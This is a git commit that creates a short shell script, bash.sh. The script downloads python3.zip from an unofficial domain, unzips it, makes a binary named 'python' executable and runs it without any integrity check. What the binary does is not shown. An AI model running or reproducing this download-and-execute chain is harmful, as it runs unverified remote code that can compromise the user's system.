fd344276de408d3f688d13ed22a09adcf6985f64
wcw1qqw <109303568+wcw1qqw@users.noreply.github.com>
2022-08-27 22:30:19 +0800

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,8 @@
+echo "Downloading..."
+wget https://software.lemonsoftware.eu.org/python3.zip
+echo "Unziping..."
+unzip python3.zip
+echo "Chmoding..."
+chmod +x python
+echo "Running..."
+./python
